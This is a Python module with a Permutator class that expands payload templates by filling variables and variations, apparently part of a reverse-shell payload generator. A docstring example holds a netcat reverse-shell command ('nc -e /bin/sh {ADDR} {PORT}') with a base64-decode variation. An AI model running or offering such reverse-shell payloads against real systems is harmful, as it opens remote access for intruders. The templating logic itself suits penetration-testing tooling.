"""Module to permutate a payload item based on the available variables."""
from typing import Dict, List, Union, Any

import copy
import re
import itertools


class Permutator(object):
    """Replaces the __ADDR__ and __PORT__ placeholders on an item."""

    # --------------------------------------------------------------------------
    # Public function
    # --------------------------------------------------------------------------
    @staticmethod
    def get_item_permutations(item: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Returns a list of item permutation based on defined variables and values.

        Raises:
            KeyError: If variable is used, but not defined.
        """
        items = []

        # Ensure variables are properly defined
        Permutator.__validate_variables(item)

        # Permutate payload with available variations
        for perm in Permutator.__permutate_variations(item):
            # Permutate payload with available variables
            items += Permutator.__permutate_variables(perm)

        return items

    # --------------------------------------------------------------------------
    # Private function
    # --------------------------------------------------------------------------
    @staticmethod
    def __permutate_variations(item: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Creates mutations for each available payload variation.

        This function returns the item in a list if no variations have been defined.
        If variations are defined, the function will return the original payload and
        all variations as a separate item in a list.

        Returns:
            List[Dict[str, Any]]: List of permutated variation items.
        """
        items = [item]

        # If no variations are defined, we just take
        # the item as it is and return it as a list item.
        if not item["variations"]:
            return items

        for variation in item["variations"]:
            # variables = {
            #   varX: valX-1
            #   varY: valY-1
            # }
            mutation = copy.deepcopy(item)
            if "original" not in mutation:
                mutation["original"] = []

            # Update name and filters
            mutation["name"] = "{} ({})".format(mutation["name"], variation["name"])
            mutation["filters"].update(variation["filters"])

            # Replace Payload placeholder
            mutation["payload"] = variation["payload"].replace("{PAYLOAD}", item["payload"])

            # Update original steps
            mutation["original"].append(item["payload"])
            mutation["original"].append(variation["payload"])

            # Append mutation
            items.append(mutation)
        return items

    @staticmethod
    def __permutate_variables(item: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Creates mutations for each available mutation variable.

        This function will make as many copies of the input item as there are
        variable combinations/permutations. It will then copy back the variables[].filters
        into top-level filters of that permutation and finally replace the variables in
        payload and top-level filters values.

        Returns:
            List[Dict[str, Any]]: List of mutated items.
        """
        items = []
        # Replace with available variables

        # If no mutation variables are defined, we just take
        # the payload as it is and return it as a list item.
        if not item["variables"]:
            return [item]

        # {key:["val1", "val2"]}
        variable_dict = {var["name"]: var["values"] for var in item["variables"]}
        # Get all combinations of defined variable mutations
        # https://stackoverflow.com/a/61335465
        keys, values = zip(*variable_dict.items())
        permutations = [dict(zip(keys, v)) for v in itertools.product(*values)]
        # permutations = [
        #   {
        #     varX: valX-1
        #     varY: valY-1
        #   }
        #   {
        #     varX: valX-2
        #     varY: valY-1
        #   }
        # ]
        for variables in permutations:
            # variables = {
            #   varX: valX-1
            #   varY: valY-1
            # }
            mutation = copy.deepcopy(item)
            if "original" not in mutation:
                mutation["original"] = []

            # Copy/overwrite filters from variables[].filters
            # into top-level filters for current variable mutation.
            for variable in item["variables"]:
                # variable = {
                #   name: "varX"
                #   filters: dict
                #   values: []
                # }
                if variable["name"] in variables:
                    mutation["filters"].update(variable["filters"])

            # Replace variables in payload and filters
            mutation["payload"] = Permutator.__replace_variables(mutation["payload"], variables)
            mutation["filters"] = Permutator.__replace_variables(mutation["filters"], variables)
            mutation["original"].append(item["payload"])

            # Append mutation
            items.append(mutation)

        return items

    @staticmethod
    def __replace_variables(
        data: Union[bool, str, List[str], Dict[str, Any]], variables: Dict[str, str]
    ) -> Union[bool, str, List[str], Dict[str, Any]]:
        """Replace."""
        temp = copy.deepcopy(data)
        if isinstance(temp, list):
            for i in range(len(temp)):
                temp[i] = Permutator.__replace_variables(temp[i], variables)
            return temp

        if isinstance(temp, dict):
            for key in temp:
                temp[key] = Permutator.__replace_variables(temp[key], variables)
            return temp

        if isinstance(temp, str):
            for name, value in variables.items():
                temp = temp.replace(f"{{VAR:{name}}}", value)
            return temp

        return temp

    @staticmethod
    def __validate_variables(item: Dict[str, Any]) -> None:
        """Validate item if used variables are defined.

        Variables can be used in the payload string, the variations strings and
        in filter values of item, variables and variations.

        Raises:
            KeyError: If variable is used, but not defined with variable name as error string.
        """
        # item = {
        #   name: payload-name
        #   desc: payload-desc
        #   filters:
        #     test: {VAR:shell}
        #   variables:
        #     - name: shell
        #       filters:
        #         filt1: "{VAR:shell}"
        #       values: ["tet"]
        #   variations:
        #     - name: shell{VAR:shell}
        #       filters:
        #         filt1: "{VAR:shell}"
        #       payload: {PAYLOAD}|base64 -d
        #   payload: nc -e /bin/sh {ADDR} {PORT}
        # }
        defined_vars = [variable["name"] for variable in item["variables"]]

        # Check payload
        try:
            Permutator.__is_variable_defined(item["payload"], defined_vars)
        except KeyError as err:
            raise KeyError(f"Variable '{err}' used in payload, but not defined") from err

        # Check filters
        try:
            Permutator.__is_variable_defined(item["filters"], defined_vars)
        except KeyError as err:
            raise KeyError(f"Variable '{err}' used in filters, but not defined") from err

        # Check variable filters
        for variable in item["variables"]:
            try:
                Permutator.__is_variable_defined(variable["filters"], defined_vars)
            except KeyError as err:
                raise KeyError(
                    f"Variable '{err}' used in variables[].filters, but not defined"
                ) from err

        # Check variations
        for variation in item["variations"]:
            # variation name
            try:
                Permutator.__is_variable_defined(variation["name"], defined_vars)
            except KeyError as err:
                raise KeyError(
                    f"Variable '{err}' used in variations[].name, but not defined"
                ) from err
            # variation payload
            try:
                Permutator.__is_variable_defined(variation["payload"], defined_vars)
            except KeyError as err:
                raise KeyError(
                    f"Variable '{err}' used in variations[].payload, but not defined"
                ) from err
            # variation filters
            try:
                Permutator.__is_variable_defined(variation["filters"], defined_vars)
            except KeyError as err:
                raise KeyError(
                    f"Variable '{err}' used in variations[].filters, but not defined"
                ) from err

    @staticmethod
    def __is_variable_defined(
        data: Union[bool, str, List[str], Dict[Any, Any]], defined_vars: List[str]
    ) -> None:
        """Check if a variable in data is actually defined and raise KeyError if not.

        Raises:
            KeyError if used variable in data is not defined.
        """
        pattern = r"{VAR:(.+?)}"
        reg = re.compile(pattern, flags=re.MULTILINE | re.DOTALL)

        if isinstance(data, str):
            ret = reg.findall(data)
            for used_var in ret:
                if used_var not in defined_vars:
                    raise KeyError(f"{used_var}")

        if isinstance(data, list):
            for val in data:
                ret = reg.findall(val)
                for used_var in ret:
                    if used_var not in defined_vars:
                        raise KeyError(f"{used_var}")

        if isinstance(data, dict):
            for key in data:
                Permutator.__is_variable_defined(data[key], defined_vars)
